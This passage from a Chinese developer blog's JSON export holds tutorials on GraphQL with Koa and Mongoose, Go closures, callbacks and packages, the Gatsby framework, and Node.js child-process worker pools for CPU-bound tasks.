REST 来说，定义一个描述 url，数据的返回完全由后端决定。而 GraphQL 就不同，你可以在前端任意的决定数据的返回格式与数量，这样一来整个的控制权从后端向前端迁移。 与 Koa 结合使用 GraphQL 与 Nodejs 结合，首先第一步我们使用 Koa 编写一个简单的 Web 服务。 1234567891011121314151617const Koa = require('koa');const Router = require('koa-router');const body = require('koa-body');const app = new Koa();const router = new Router();router .get('/', async ctx =&gt; &#123; ctx.body = &#123; path: '/' &#125;; &#125;);app .use(body()) .use(router.routes()); .listen(3000); 这时候运行起来的时候，就可以看到页面响应了 { &quot;path&quot;: &quot;/&quot; } 的 json 数据。 接着我们把为 Koa 添加 GraphQL 的 IDE。 先安装 graphql 和 graphql-server-koa 两个模块。 123456789// ...const &#123; graphqlKoa, graphiqlKoa &#125; = require('graphql-server-koa');// ...router .get('/graphiql', async (ctx, next) =&gt; &#123; // 重定向到 graphiql 路由 await graphiqlKoa(&#123; endpointURL: '/graphql' &#125;)(ctx, next) &#125;) 这时，访问 /graphiql 时，会看到一个 GraphQL IDE，同时注意到了控制台报错： 1POST http://127.0.0.1:3000/graphql? 404 (Not Found) 好接下来解决这个 404 错误。 GraphQL 模型GraphQL 的第一步就是描述你的数据，那么模型是必不可少的一部分。 下面就来定义一个 文章 数据模型。 1234567891011121314151617181920212223242526272829303132333435363738const &#123; graphql, GraphQLSchema, GraphQLObjectType, GraphQLString, GraphQLID, GraphQLList, GraphQLNonNull, isOutputType,&#125; = require('graphql');const ArticleSchema = new GraphQLObjectType(&#123; name: 'article', // 模型名称 fields: &#123; // 模型字段 title: &#123; type: GraphQLString, // 字段类型 &#125;, author: &#123; type: GraphQLString, &#125;, body: &#123; type: GraphQLString &#125;, comments: &#123; // 数组字段 type: new GraphQLList(new GraphQLObjectType(&#123; name: 'comment', fields: &#123; body: &#123; type: GraphQLString, &#125;, date: &#123; type: GraphQLString, &#125; &#125; &#125;)), &#125; &#125;&#125;); 首先是引入了 GraphQL 的类型系统，接着定义了 评论 模型，文章 模型。 处理数据在定义完模型后，就要定义一个处理数据的对象。这个对象直接映射到查询的对象，这部分叫它为 action。 在这个 article 里返回一段模拟数据，也就是 resolve 里的 return。 1234567891011121314151617const article = &#123; type: ArticleSchema, args: &#123;&#125;, // 查询的参数列表 resolve(root, params, options) &#123; return &#123; // 模拟数据 title: \"GraphQL 结合 Koa 实践体验\", author: \"Lizhooh\", body: \"前段时间有空去看了一天的 GraphQL 文档，对 GraphQL 也有些理解了。\" + \"今天有空把 GraphQL 与 Koa 结合起来实际一把，其中还掺杂着 Mongodb。\", comments: [ &#123; body: \"很好\", date: \"2018-01-12 22:46:12\" &#125;, &#123; body: \"不错\", date: \"2018-01-12 22:47:22\" &#125;, ], &#125;; &#125;&#125;; 连接路由最后还需要定义一个查询模型： 12345678const Schema = new GraphQLSchema(&#123; query: new GraphQLObjectType(&#123; name: 'query', fields: &#123; article, &#125;, &#125;)&#125;); 接着在路由里添加路径： 1234567router .post('/graphql', async (ctx, next) =&gt; &#123; await graphqlKoa(&#123; schema: Schema &#125;)(ctx, next) &#125;) .get('/graphql', async (ctx, next) =&gt; &#123; await graphqlKoa(&#123; schema: Schema &#125;)(ctx, next) &#125;) 好了，但你访问 http://127.0.0.1:3000/graphiql 时，在 IDE 里输入以下内容时，能够正确返回结果，那么就成功把 GraphQL 和 Koa 结合起来了。 根据参数查询在上面定义了一个没有查询条件的 action，现在把它改为根据条件查询。 123456// 在 args 里修改一下args: &#123; author: &#123; type: new GraphQLNonNull(GraphQLString) // 不能为空 &#125;&#125;, 结合 MongooseGraphQL 里有模型，Mongoose 里也有模型，它们两个是不相关联的。唯一可以关联在一起的是 resolve 函数。 所以，需要定义两分模型，一份是 GraphQL 的模型，另一份是 Mongoose 的模型。 1234567891011const ArticleSchema2 = new mongoose.Schema(&#123; title: String, author: String, body: String, comments: [&#123; body: String, date: String, &#125;],&#125;);mongoose.model('article', ArticleSchema2, 'article'); 在 action 里 123456789const Article = mongoose.model('article');const article = &#123; type: ArticleSchema, args: &#123;&#125;, async resolve(root, params, options) &#123; // 返回数据库的数据 return await Article.find(&#123;&#125;).limit(10); &#125;&#125;; 小结GraphQL 的数据格式可以由前端进行描述，然后在 Nodejs 里 GraphQL 会根据描述来返回数据。这样好是好，但是面临着几个问题。 解析是需要时间的，在 REST 与 GraphQL 的响应时间是有差距的。 GraphQL 需要定义模型，对于数据非常复杂的情况下，这可不是很少的代码量。 GraphQL 的错误机制，目前还不清楚，感觉有点不可控，有时候返回一些莫名其妙的错误。 GraphQL 调试非常困难（可能是我不会）。","categories":[{"name":"GraphQL","slug":"GraphQL","permalink":"http://me.lizhooh.com/categories/GraphQL/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/tags/Koa/"},{"name":"GraphQL","slug":"GraphQL","permalink":"http://me.lizhooh.com/tags/GraphQL/"}]},{"title":"小谈 Go 中闭包与回调","slug":"Go/小谈 Go 中闭包与回调","date":"2018-01-05T11:35:19.000Z","updated":"2021-06-15T06:10:52.819Z","comments":true,"path":"/stories/2018/01/Go/小谈 Go 中闭包与回调/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/Go/小谈 Go 中闭包与回调/","excerpt":"前言Javascript 里都有一个非常明显的特性，那就是闭包与回调。在 Go 里也有这种特性，它通过灵活的方式进行展示。 闭包闭包是一个特殊的结构，通常在一个函数（A）内返回另一个函数（B），这个返回的函数（A）引用了它所在的函数（B）里的变量。那么就构成了一个闭包结构。","text":"前言Javascript 里都有一个非常明显的特性，那就是闭包与回调。在 Go 里也有这种特性，它通过灵活的方式进行展示。 闭包闭包是一个特殊的结构，通常在一个函数（A）内返回另一个函数（B），这个返回的函数（A）引用了它所在的函数（B）里的变量。那么就构成了一个闭包结构。 例如 Javascript 中的闭包： 1234567891011121314function Adder(n) &#123; let sum = n; return function(x) &#123; sum += x; return sum; &#125;&#125;const adder = Adder(0);adder(1); // 1adder(2); // 3adder(3); // 6adder(4); // 10 在上面，定义了一个 Adder 闭包函数，这个函数返回了一个新的函数，新的函数不断修改闭包里面的值。闭包所带来的好处很明显，就是提供一个封闭的空间，在上面 n 就是一个私有变量，外部不能访问，仅靠闭包返回的函数进行修改。往往在 Javascript 里定义类结构，都会看到闭包的身影，因为它实在太重要了。 那么来看看 Go 里如何定义闭包，实际上结构是一样的。 1234567891011121314func Adder(n int) func(x int) int &#123; var sum = n return func() int &#123; sum += n return sum &#125;&#125;adder := Adder(0)adder(1); // 1adder(2); // 3adder(3); // 6adder(4); // 10 Go 的闭包与 Javascript 不同的是，在 Go 里需要指定参数类型，返回类，因为它是强类型语言，除此之外，闭包的结构几乎是一样的。 但是有一点需要注意的，Go 只允许返回匿名函数，也就是说不能在函数内定义函数声明。 比如，上面的代码改为： 12345678func Adder(n int) func(int) int &#123; var sum = n func add(x int) int &#123; sum += x return sum &#125; return add&#125; 这种结构在 Javascript 里是没有问题的，但是在 Go 里会报错，原因在于 Go 不能写嵌套函数。 回调回调（callback）模式是一个非常好的模式，它可以让在一个函数里嵌入另一个函数。 比如在 Javascript 里，我们可以轻易的利用回调函数来计算某个函数的运行时间。 123456function runTime(callback) &#123; const start = Date.now(); typeof callback === 'function' &amp;&amp; callback(); const end = Date.now(); console.log((end - start) + ' ms');&#125; 在 Go 里同样也可以利用回调函数实现这种功能，那么来看看如何实现。 非常简单的在参数里指定是函数类型，因为 Go 是强类型语言，所以不能像 Javascript 那样只写一个参数名称即可，而是需要指明回调函数类型。 1234567891011121314151617181920package mainimport ( \"fmt\" \"time\")func runTime(callback func()) &#123; var start = time.Now() callback() fmt.Println(time.Since(start))&#125;func main() &#123; runTime(func() &#123; for i := 0; i &lt; 1e8; i++ &#123; // ... &#125; &#125;)&#125; 在整个形式结构上基本和 Javascript 差不多，唯一不同的是需要指定回调参数类型。下面就为通过回调的方式定义一个类似 Javascript 中的 filter 函数。 12345678910111213141516171819202122232425262728293031package mainimport ( \"fmt\" \"time\")func runTime(callback func()) &#123; var start = time.Now() callback() fmt.Println(time.Since(start))&#125;func filter(arr []int, callback func(item int, index int, list []int) bool) []int &#123; var _arr = make([]int, 0) for i := 0; i &lt; len(arr); i++ &#123; if callback(arr[i], i, arr) &#123; _arr = append(_arr, arr[i]) &#125; &#125; return _arr&#125;func main() &#123; arr := []int&#123;1, 2, 3, 4, 5, 6, 7, 8, 9&#125; arr = filter(arr, func(item int, index int, list []int) bool &#123; return item % 3 == 0 &#125;) fmt.Println(arr) // [3, 6, 9]&#125; 因为 Go 是强类型语言，所有回调函数参数需要指定类型，返回值（如果有）也需要指定类型才可以。目前 Go 还没有泛型，所有对于不同类型的数组类型还是自己定义 filter 好。 回调列表在 Go 里和 ES6 一样可以使用 ... 表示多参数列表。 123456type HandlerFunc func(*Context)func get(handlers ...HandlerFunc) &#123; for i := 0; i &lt; len(handlers); i++ &#123; // ... &#125;&#125; 扩展我们可以利用闭包与回调，在 Go 上定义一个类型 promise 的结构。 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( \"fmt\")type Any interface&#123;&#125; // 接口type Callback func(any Any) // 回调函数type Promise struct&#123;&#125; // promise// this 不是 this，this 只是一个参数名称func (this *Promise) new(cb func(p *Promise)) *Promise &#123; cb(this) return this&#125;func (this *Promise) resolve(any Any, cb Callback) *Promise &#123; cb(any) return this&#125;func (this *Promise) reject(any Any, cb Callback) *Promise &#123; cb(any) return this&#125;func main() &#123; var p = new(Promise) p.new(func(this *Promise) &#123; if 1 &gt; 2 &#123; this.resolve(true, func(any Any) &#123; fmt.Println(\"resolve\", any) &#125;) &#125; else &#123; this.reject(false, func(any Any) &#123; fmt.Println(\"reject\", any) &#125;) &#125; &#125;)&#125;","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"小谈 Go 中的包与模块","slug":"Go/小谈 Go 中的包与模块","date":"2018-01-03T14:20:52.000Z","updated":"2021-06-15T06:10:52.818Z","comments":true,"path":"/stories/2018/01/Go/小谈 Go 中的包与模块/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/Go/小谈 Go 中的包与模块/","excerpt":"前言任何包系统设计的目的都是为了简化大型程序的设计和维护工作，通过将一组相关的特性放进一个独立的单元以便于理解和更新，在每个单元更新的同时保持和程序中其它单元的相对独立性。这种模块化的特性允许每个包可以被其它的不同项目共享和重用，在项目范围内、甚至全球范围统一的分发和复用。 包的作用更多的是未来解决函数命名冲突的问题。 Go 中的包与模块Go 中的包与模块，使用 import 关键字，通过路径进行导入。","text":"前言任何包系统设计的目的都是为了简化大型程序的设计和维护工作，通过将一组相关的特性放进一个独立的单元以便于理解和更新，在每个单元更新的同时保持和程序中其它单元的相对独立性。这种模块化的特性允许每个包可以被其它的不同项目共享和重用，在项目范围内、甚至全球范围统一的分发和复用。 包的作用更多的是未来解决函数命名冲突的问题。 Go 中的包与模块Go 中的包与模块，使用 import 关键字，通过路径进行导入。 常见的几种方式： 12345678910111213package bee // 包的声明import ( \"fmt\" // 系统自带模块 \"math/rand\" \"encoding/json \"golang.org/x/net/html\" // Go 仓库的模块 \"github.com/go‐sql‐driver/mysql\" // 第三方的模块 \"./module/http\" // 自定义的模块 _ \"./hello/imp\" // 匿名导入 imp \"./hello/imp\" // 包的导入声明) import 下划线（如：import _ &quot;hello/imp&quot;）的作用：当导入一个包时，该包下的文件里所有 init() 函数都会被执行，然而，有些时候我们并不需要把整个包都导入进来，仅仅是是希望它执行 init() 函数而已。这个时候就可以使用 import _ 引用该包。 通常使用第三方的模块，需要使用 go get 安装，比如： 1go get github.com/go-sql-driver/mysql 这时，会安装到你的 Go PATH 目录里，使用的时候只需要直接引用即可。 如何正确的查找文档？一开始去官网找，后来发现官网被墙了，好在 go 提供了一个本地的文档服务。只需要启动：godoc ‐http :5000 即可。 自定义模块下面以一个实际的目录结构来说明，如何自定义模块。 假设有以下目录结构： 1234567App├── m1│ └── add.go├── m2│ └── sub.go│└── app.go 其中 add.go 文件内容： 12345package m1func Add(a int, b int) int &#123; return a + b&#125; sub.go 文件内容： 12345package m2func Sub(a int, b int) int &#123; return a - b&#125; 在 app.go 里引用 m1，m2 里的模块。很明显在 Nodejs 里是非常容易的一件事情。 而在 Go 里视乎也很容易，大概是这样子。 1234567891011121314package mainimport ( \"fmt\" \"./m1\" \"./m2\")func main() &#123; a := m1.Add(1, 2) b := m2.Add(3, 1) fmt.Println(a, b)&#125; 有几个问题要弄明白： m1，m2 那里冒出来？ 在每个Go语言源文件的开头都必须有包声明语句。包声明语句的主要目的是确定当前包被其它包导入时默认的标识符（也称为包名）。在上面 package m1 就是默认导出的包名，但是有一个名称不能作为模块用，那就是 main。在模块里使用 main 作为包名了会报错：import “./m1” is a program, not an importable package 如何不使用默认包名称？ 只需要 import M1 “./m1” 就可以使用自定义的包名称。 同一个包名的文件可以直接引用。 比如现在，多添加一个 add2.go 文件，在里面直接引用 Add。它可以正常执行，因为 Add 与 Add2 是处于同一个包名称下的。 12345package m1func Add2(a int, b int) int &#123; return Add(a, b)&#125; 如果自定义包与 main 包在同一个目录下 Go 就会报错，不知为何要这样限定。因此，自定义包需要放在其他目录下，并且文件名最好与包名相同。 大写开头为公有函数，小写开头为私有函数。 这是 Go 规定的规范，目的是为了少打 public 这些关键字。","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"Gatsby：静态 Web 应用框架","slug":"React/React/Gatsby：静态 Web 应用框架","date":"2018-01-01T12:30:09.000Z","updated":"2021-06-15T06:10:52.875Z","comments":true,"path":"/stories/2018/01/React/React/Gatsby：静态 Web 应用框架/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/React/React/Gatsby：静态 Web 应用框架/","excerpt":"前言Gatsby 是一个静态 Web 应用框架，允许你使用 React 来开发静态 Web 应用。Gatsby.js 与 Next.js 很像，只不过它们的出发点不同。😋","text":"前言Gatsby 是一个静态 Web 应用框架，允许你使用 React 来开发静态 Web 应用。Gatsby.js 与 Next.js 很像，只不过它们的出发点不同。😋 使用如何使用？当然是安装 cli，然后各种搞。 12npm install -g gatsby-cligatsby new myproject 创建之后有几个命令可用： gatsby develop 热生成一个开发环境。 gatsby build 编译，生成静态文件。 gatsby serve 启动一个本地的服务器。 结构创建完成项目后，会看到 src/pages，src/layouts 等。 Gatsby 的页面结构基本与 Next.js 差不多。 它们分别代表着是：页面文件与布局文件，页面文件与路由相对应。 比如： 12pages/user/index -&gt; http://127.0.0.1:3000/user/index.htmlpages/home/about -&gt; http://127.0.0.1:3000/home/about.html 在根目录下有几个比较重要的文件： gatsby-browser.js，浏览器运行相关，发生在浏览器运行的时候。 gatsby-node.js，运行相关，发生在 Gatsby 启动的时候。 gatsby-ssr.js，服务端渲染相关。 gatsby-config.js，配置相关。 样式css 有两种用法，一种是带 module，另一种是不带 module 的。 12import './app.css';import style from './app.module.css'; 它们的区别就是不带 module 的作为 css 文件来处理，带 module 的作为 css 模块 来处理。 使用 styled无论如何 styled-components 还是非常好的 css-in-js 框架。在 Gatsby 里 styled-components 需要安装一下插件。 1npm install --save-dev gatsby-plugin-styled-components styled-components 在 /gatsby-config.js 里添加： 1234567module.exports = &#123; // ... plugins: [ // ... `gatsby-plugin-styled-components`, ],&#125; 之后，爱怎么玩就怎么玩。 路由Gatsby 自带路由系统，使用起来与 react-router 类似。 123456789import React from 'react';import Link from 'gatsby-link';export default () =&gt; ( &lt;div&gt; &lt;h1&gt;Hi people&lt;/h1&gt; &lt;Link to=\"/page-2/\"&gt;Go to page 2&lt;/Link&gt; &lt;/div&gt;); 布局默认情况下，所有的页面将使用在找到的布局 /layouts/index.js，然后把 pages 里的页面放进布局文件里（通过 children 方式）。 12345678910111213import React from \"react\";export default (&#123; children &#125;) =&gt; ( &lt;div style=&#123;&#123; margin: '0 auto', maxWidth: 650, padding: '0 1rem' &#125;&#125; &gt; &#123;children()&#125; &lt;/div&gt;); 如果想指定布局文件，需要编写以下代码（在 /gatsby-node.js 里）。 123456789101112exports.onCreatePage = async (&#123; page, boundActionCreators &#125;) =&gt; &#123; const &#123; createPage &#125; = boundActionCreators; return new Promise((resolve, reject) =&gt; &#123; // 匹配路径 if (page.path.match(/^\\/landing-page/)) &#123; // 使用其他布局文件：layouts/landingPage.js page.layout = \"landingPage\"; createPage(page); &#125; resolve(); &#125;);&#125;; 配置项与环境变量配置项都是在 /gatsby-config.js 下编写。 123456module.exports = &#123; siteMetadata: &#123; title: `hello`, // html &gt; title &#125;, pathPrefix: `/blog`, // 所有路由的前缀&#125;; 如果想自定义 html, head 需要使用指定的方式。 先安装插件： 1plugins: ['gatsby-plugin-react-helmet'] 接着在布局文件里使用： 123456789import Helmet from 'react-helmet';&lt;Helmet title=\"Gatsby Default Starter\" meta=&#123;[ &#123; name: 'description', content: 'Sample' &#125;, &#123; name: 'keywords', content: 'sample, something' &#125;, ]&#125;/&gt; 自定义 html.js默认是没有 html 文件给你的，因为这些都是动态编译生成的。如果想，自定义 html 也可以，不过只能是 html.js。 先把默认的复过来，改改。 1cp .cache/default-html.js src/html.js 需要注意的是 html.js 的内容是不会动态改变的，也就是不能通过 this.setState 去更改。 环境变量除了 .env.* 文件之外，环境中的任何变量 GATSBY_ 都会在浏览器 JavaScript 中提供。 要添加它们只需要在 跟目录下添加两个文件 .env.development，.env.production。 12345// .env.productionGATSBY_ASSETS_URL = http://s3.amazonaws.com/bucketname// user.js&lt;img src=&#123;`$&#123;process.env.GATSBY_ASSETS_URL&#125;/logo.png`&#125; alt=\"Logo\" /&gt; 其他的环境变量，请使用 dotenv。 12345# Example .env.development fileAPI_URL=https://dev.example.com/api# Example .env.production fileAPI_URL=https://example.com/api","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Nodejs 多核工作进程『池』架构设计","slug":"Nodejs/Nodejs 多核工作进程『池』架构设计","date":"2017-12-30T01:07:17.000Z","updated":"2021-06-15T06:10:52.839Z","comments":true,"path":"/stories/2017/12/Nodejs/Nodejs 多核工作进程『池』架构设计/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/Nodejs/Nodejs 多核工作进程『池』架构设计/","excerpt":"前言引出场景，还是关于 CPU 密集计算的问题，假设现在有很多计算任务，笔者我可能会选择使用 Child_Process 模块的 Fork 形式来执行计算任务。每来一个任务就 Fork 创建一个工作进程，执行完成后就释放工作进程。这样看起来好像没什么问题，其实它是有问题的。首先创建进程是消耗 CPU 和内存的，每个 Fork 进程都是一个 V8 实例，创建至少需要 30ms 和 10mb 以上的资源。 现在可以换一个角度思考，如何创建后就让它持久不倒呢？这样就可以避免重新创建所带来的额外操作。","text":"前言引出场景，还是关于 CPU 密集计算的问题，假设现在有很多计算任务，笔者我可能会选择使用 Child_Process 模块的 Fork 形式来执行计算任务。每来一个任务就 Fork 创建一个工作进程，执行完成后就释放工作进程。这样看起来好像没什么问题，其实它是有问题的。首先创建进程是消耗 CPU 和内存的，每个 Fork 进程都是一个 V8 实例，创建至少需要 30ms 和 10mb 以上的资源。 现在可以换一个角度思考，如何创建后就让它持久不倒呢？这样就可以避免重新创建所带来的额外操作。 好，基于这种设计理论，笔者我把每个计算任务都放进队列里，按照先进先出的流程处理任务（当然也可以是优先队列，按照重要相关性）。主进程创建后，立即创建相关数量的工作进程待机等待任务。主进程负责分配任务，已经处理任务结果，而工作进程负责计算任务，这看起来就像是均衡负载一样。 基础架构对于整个基础架构来说，它有几件重要的事情要做： 初始化阶段，主进程分配 id 通过 Fork 方式创建工作进程。 工作进程创建完成后，进行绑定相关自定义事件，进入待机状态，等待任务的来临。 主进程进行任务调度，工作进程接收到通知后，开始处理任务。 工作进程任务处理完成后，把结果返回个主进程。 主进程周期性检查任务队列是否为空，没有则进行任务调度。 主进程满足以下条件： 保证任务队列的完整性。 保证每个任务的后序处理结果能得到进一步的处理。 保证任务调度函数的稳定性。 工作进程满足以下条件： 保证任务处理的准确性与完整性。 如果任务处理出错，可以通知主进程调整后进行重试。 如果工作进行因为某种原因挂了，应该通知主进程重新 Fork 创建工作进程。 使用 EventEmitter因为主进程与工作进程的通信是对称 API，通过 process.send 和 process.on(‘message’) 来通信。为了能够更加的可用性，使用 EventEmitter 来处理 process.on(‘message’) 里的事情。 先是定义一个通用的事件基类，它做的事情非常简单，只是根据 process.on(‘message’) 中的参数分发不同的自定义事件。 12345678910111213141516171819202122// p-event.jsconst EventEmitter = require('events');module.exports = class PEvent extends EventEmitter &#123; constructor(who) &#123; super(); this.who = who; this.who.on('message', (&#123; event, args &#125;) =&gt; &#123; super.emit(event, ...args); &#125;); &#125; on(event, callback) &#123; if (typeof event === 'string' &amp;&amp; event) &#123; super.addListener(event, callback); &#125; &#125; emit(event, ...args) &#123; this.who.send(&#123; event, args &#125;); &#125;&#125; 因为主进程与工作进程的通信是对称的，所以很容易就可以把它封装成事件驱动。这样就可以基于自定义的事件让主进程与工作进程通信了。 初始化阶段为了能够最大的利用多核 CPU 的性能，指定了工作进程的个数等于 CPU 核心个数。 12345678910111213// index.js [主进程]const cp = require('child_process');const cpus = require('os').cpus();const colors = require('colors');// 任务队列const tasks = [];// 初始化const workers = [...new Array(cpus.length)].map((worker, id) =&gt; &#123; worker = cp.fork('./worker.js', [id]); worker.id = id; // 分配 id worker.free = true; // 表示是否空闲，默认空闲 return worker;&#125;); 绑定相关事件创建完还不行，还需要绑定相关事件。 12345678910111213141516// 绑定事件workers.forEach(worker =&gt; &#123; const id = worker.id; worker.self = new PEvent(worker); worker.self.on('completed', function (id, &#123; result, duration, memory &#125;) &#123; console.log( 'memory use: '.blue + decimal(memory) + ' mb', 'completed'.yellow, 'id = ' + id, decimal(result), duration + ' ms', ); workers[id].free = true; dispatcher(); &#125;);&#125;); 任务调度函数任务调度函数的事情更多是找空闲的工作进程，然后分配任务给它。 1234567891011121314151617function dispatcher() &#123; if (tasks.length === 0) &#123; console.log('[队列] 任务队列为空'.green); return; &#125; for (let i = 0, len = workers.length; i &lt; len; i++) &#123; const worker = workers[i]; if (worker.free) &#123; worker.free = false; const task = tasks.shift(); // 出队 // 发任务 worker.self.emit('go', task); return; &#125; &#125;&#125; 工作进程在工作进程里，有一个密集的 CPU 计算，那就是排列组合里的组合 C(n, m)，表示从集合元素为 n 中取出 m 个元素的组合个数。 C(n, m) 返回的是一个组合结果二维数组，默认情况下，它会使用数组下标作为结果集合。 比如 C(10, 3) 得到的可能是：[1, 2, 3]，[1, 2, 4] 等。 工作进程里处理的是计算 C(n, m) 结果集合的个数，也就是组合个数。 123456789101112131415161718const C = require('./C');const args = process.argv.slice(2);const id = args[0];console.log('[创建工作进程]', process.pid);const PEvent = require('./p-event');const self = new PEvent(process);self.on('go', function (n) &#123; const start = Date.now(); const res = C(n, 3).length; const end = Date.now(); this.emit('completed', id, &#123; result: res, duration: (end - start), memory: getMemoryUsage(), &#125;);&#125;); 模拟任务目前为止，还没任务输入，就此自己来模拟一下任务。 1234567891011// 每 1s 任务调度一次setTimeout(() =&gt; &#123; setInterval(() =&gt; &#123; dispatcher(); &#125;, 1000 * 1);&#125;, 1000 * 5);// 每 120ms 添加一个任务setInterval(() =&gt; &#123; tasks.push(randInt(10, 150)); // randInt 是一个随机函数&#125;, 120); 对于任务调度来说会存在两个地方： 新添加任务时，调度一次。 工作进程处理完成后，调度一次。 这里为了简单，设置了一个定时器，定时调度。 运行运行起来哗啦啦的。 小结在本文只是设计一个非常简单的多核工作进程池架构，引出了 Nodejs 在处理密集 CPU 任务上可行的解决方案。 参考资料 《Node.js硬实战：115个核心技巧》4. Events：玩转 EventEmitter, 8.2.1 工作池","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"探讨：Nodejs 是如何应对 CPU 密集型任务的","slug":"Nodejs/探讨：Nodejs 是如何应对 CPU 密集型任务的","date":"2017-12-24T12:20:59.000Z","updated":"2021-06-15T06:10:52.845Z","comments":true,"path":"/stories/2017/12/Nodejs/探讨：Nodejs 是如何应对 CPU 密集型任务的/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/Nodejs/探讨：Nodejs 是如何应对 CPU 密集型任务的/","excerpt":"前言Nodejs 天生异步，其最擅长的是处理密集型的 IO 任务。但是面对 CPU 密集型任务，Nodejs 就显得非常无力了。其中最大的原因是 Nodejs 单线程运行，并且采用事件循环的机制，导致在做密集计算时把整个事件循环都堵塞了。因为，Event Loop 在处理所有的任务、事件时都是沿着事件队列顺序执行的，所以在其中任何一个任务没有完成之前，其它的任务是无法进行的，也没有抢占式的方式执行其他任务，这就意味着密集计算很有可能会造成事件循环的阻塞。 如果真的想要在 Nodejs 里做密集计算不是不可能，而且有很多方法可以解决，只是不太推荐使用 Nodejs 做密集计算，特别是有其他 IO 的应用。","text":"前言Nodejs 天生异步，其最擅长的是处理密集型的 IO 任务。但是面对 CPU 密集型任务，Nodejs 就显得非常无力了。其中最大的原因是 Nodejs 单线程运行，并且采用事件循环的机制，导致在做密集计算时把整个事件循环都堵塞了。因为，Event Loop 在处理所有的任务、事件时都是沿着事件队列顺序执行的，所以在其中任何一个任务没有完成之前，其它的任务是无法进行的，也没有抢占式的方式执行其他任务，这就意味着密集计算很有可能会造成事件循环的阻塞。 如果真的想要在 Nodejs 里做密集计算不是不可能，而且有很多方法可以解决，只是不太推荐使用 Nodejs 做密集计算，特别是有其他 IO 的应用。 密集计算任务所谓的密集计算任务就是 CPU 在一定时间内进行大量的数据计算、逻辑判断、循环等操作，几乎不存在空闲的时间段。 假设现在有一个密集计算任务：sum.js。 1234567module.exports = (n = 1e9) =&gt; &#123; let sum = 0.0; for (let i = 0; i &lt; n; i++) &#123; sum += 0.01; &#125; return sum;&#125; 现在我们有 n 个这样的任务，需要计算。（这里假定 n = cpu 内核个数） 1234567891011121314151617181920const cp = require('child_process');const cpus = require('os').cpus();const sum = require('../sum');console.time('completed');console.log('[启动] 主进程：' + process.pid);Promise.all( [...new Array(cpus.length)] .map((_, id) =&gt; new Promise(resolve =&gt; &#123; process.nextTick(() =&gt; &#123; console.time('task' + id); resolve(sum()); console.timeEnd('task' + id); &#125;) &#125;))).then(res =&gt; &#123; console.timeEnd('completed'); process.exit(0);&#125;).catch(err =&gt; console.error(err)); 尽管使用了 Promise 和 process.nextTick 让它们去并发执行，但是最后还是按顺序执行，并且在密集计算的时候，会大量阻塞前面的计算和阻塞当前线程。 执行结果是： 12345678910[启动] 主进程：6480task 0: 1040.212 mstask 1: 1037.627 mstask 2: 1038.216 mstask 3: 1032.758 mstask 4: 1038.189 mstask 5: 1037.238 mstask 6: 1043.987 mstask 7: 1039.862 mscompleted: 8313.247 ms 本代码运行在 Intel I7 7700 3.6GHz 8 核 CPU 上。 Fork 方式在处理大数据量计算任务方面，Web 里有 web worker 为浏览器和 js 提供了一种较为优雅的方式。它使得任务脱离了主线程，通过使用一种内置于父进程与子进程间的通信来处理问题。在 Nodejs 里也有类似的概念，那就是使用与之稍微不同的 fork 方式。这种方式同样能够帮助我们将大批任务压力分解到一个独立的进程中，也使得事件循环仍然保存顺畅。 基于上面的缺点，现在把它改成使用 child_process 模块创建 Fork 多个进程的方式来处理这些任务。父进程与子进程通过 PIC 通道来通信。 那么先编写工作进程的代码，它的作用是通过父进程发送的命令来进行任务，最后会把任务返回给父进程。 12345678910111213// worker.jsconst sum = require('../sum');console.log('[创建] 工作进程：' + process.pid);process.on('message', ([task, id]) =&gt; &#123; if (task === 'go') &#123; console.time('task ' + id); const res = sum(); console.timeEnd('task ' + id); process.send(res); &#125;&#125;); 如果父进程发出 go 命令，那么就开始执行任务。 接着完善父进程的代码。 1234567891011121314151617181920const cp = require('child_process');const cpus = require('os').cpus();const sum = require('../sum');console.time('completed');console.log('[启动] 主进程：' + process.pid);Promise.all( [...new Array(cpus.length)] .map((_, index) =&gt; &#123; const work = cp.fork('./worker.js'); work.send(['go', index]); return new Promise((resolve, reject) =&gt; &#123; work.on('message', resolve); &#125;); &#125;)).then(res =&gt; &#123; console.timeEnd('completed'); process.exit(0);&#125;).catch(err =&gt; console.error(err)); 这时看到的结果是： 123456789101112131415161718[启动] 主进程：7308[创建] 工作进程：6032[创建] 工作进程：7260[创建] 工作进程：4660[创建] 工作进程：5860[创建] 工作进程：7496[创建] 工作进程：7628[创建] 工作进程：7944[创建] 工作进程：7800task 1: 1290.236 mstask 3: 1296.310 mstask 2: 1289.078 mstask 5: 1280.223 mstask 4: 1319.694 mstask 7: 1272.052 mstask 6: 1311.089 mstask 0: 1861.045 mscompleted: 2060.316 ms 使用 Fork 后，明显看到每个任务的计算都没有发生阻塞，就好像是并行操作一样，时间足足省了 300%。而且这种计算能力会随着 CPU 